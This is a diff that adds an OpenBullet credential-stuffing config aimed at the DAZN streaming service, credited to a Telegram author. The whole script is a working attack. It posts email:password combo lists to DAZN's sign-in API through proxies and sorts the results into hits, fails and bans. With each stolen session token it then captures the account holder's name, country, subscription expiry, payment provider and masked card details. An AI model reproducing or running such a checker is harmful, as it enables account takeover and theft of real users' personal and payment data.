@@ -1,0 +1,175 @@
+[SETTINGS]
+{
+  "Name": "dazn.com",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2021-09-24T13:54:54.0037251+03:30",
+  "AdditionalInfo": "https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor | Telegram Channel: @Open_Bullet_Config",
+      "VariableName": "",
+      "Id": 1321586173
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Rndm1 FUNCTION RandomString "?d?d?d?d?d?d?d?d?l?d" -> VAR "Rndm1" 
+
+#Rndm2 FUNCTION RandomString "?d?l?d?l?l?l?l?d?l?l?l?l?l?l?l?l?d?l?d?l?l?l?l" -> VAR "Rndm2" 
+
+#Login REQUEST POST "https://authentication-prod.ar.indazn.com/v5/SignIn" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"DeviceId\":\"<Rndm1>\",\"Platform\":\"web\",\"ProfilingSessionId\":\"<Rndm2>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: authentication-prod.ar.indazn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.dazn.com/" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Te: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidPassword" 
+    KEY "User is restricted to home country." 
+  KEYCHAIN Success OR 
+    KEY "Token\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "429" 
+    KEY "DAZN isn't available via VPN." 
+
+#Token PARSE "<SOURCE>" JSON "Token" -> VAR "Token" 
+
+#Get REQUEST GET "https://user-profile.ar.indazn.com/v1/UserProfile" 
+  
+  HEADER "Host: user-profile.ar.indazn.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.dazn.com/" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Te: trailers" 
+
+#FirstName PARSE "<SOURCE>" JSON "FirstName" CreateEmpty=FALSE -> CAP "FirstName" 
+
+#LastName PARSE "<SOURCE>" JSON "LastName" CreateEmpty=FALSE -> CAP "LastName" 
+
+#UserCountryCode PARSE "<SOURCE>" JSON "UserCountryCode" CreateEmpty=FALSE -> CAP "UserCountryCode" 
+
+#Get REQUEST GET "https://subscriptions-service.dazn-api.com/fe/v1/subscriptions" 
+  
+  HEADER "Host: subscriptions-service.dazn-api.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.dazn.com/" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Origin: https://www.dazn.com" 
+  HEADER "Dnt: 1" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Te: trailers" 
+
+#expireDate PARSE "<SOURCE>" JSON "nextPaymentDate" CreateEmpty=FALSE -> CAP "expireDate" 
+
+#unix FUNCTION DateToUnixTime "yyyy-MM-dd" "<expireDate>" -> VAR "unix" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+IF "<current>" GreaterThan "<unix>"
+SET STATUS CUSTOM "EXPIRED"
+ENDIF
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#paymentMethod PARSE "<SOURCE>" LR "paymentMethod\":{\"type\":\"" "\"" CreateEmpty=FALSE -> CAP "paymentMethod" 
+
+IF "<paymentMethod>" Contains "External"
+
+#provider PARSE "<SOURCE>" JSON "provider" CreateEmpty=FALSE -> CAP "provider" 
+
+JUMP #ENd
+ENDIF
+
+#creditCardMaskNumber PARSE "<SOURCE>" JSON "creditCardMaskNumber" -> VAR "creditCardMaskNumber" 
+
+#L FUNCTION Length "<creditCardMaskNumber>" -> VAR "L" 
+
+#Key FUNCTION Constant "creditCardMaskNumber\":\"null" -> VAR "Key" 
+
+IF "<L>" GreaterThan "5"
+IF "<SOURCE>" DoesNotContain "<Key>"
+
+#creditCardExpirationMonth PARSE "<SOURCE>" JSON "creditCardExpirationMonth" -> VAR "creditCardExpirationMonth" 
+
+#creditCardType PARSE "<SOURCE>" JSON "creditCardType" -> VAR "creditCardType" 
+
+#creditCardExpirationYear PARSE "<SOURCE>" JSON "creditCardExpirationYear" -> VAR "creditCardExpirationYear" 
+
+SET CAP "CARD" "<creditCardType> | <creditCardMaskNumber> | <creditCardExpirationMonth> | <creditCardExpirationYear>" 
+ENDIF
+ENDIF
+
+#ENd FUNCTION Constant -> VAR "ENd" 
+
+SET CAP "Config By" "@Hogo_Victor"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletChannel"
+
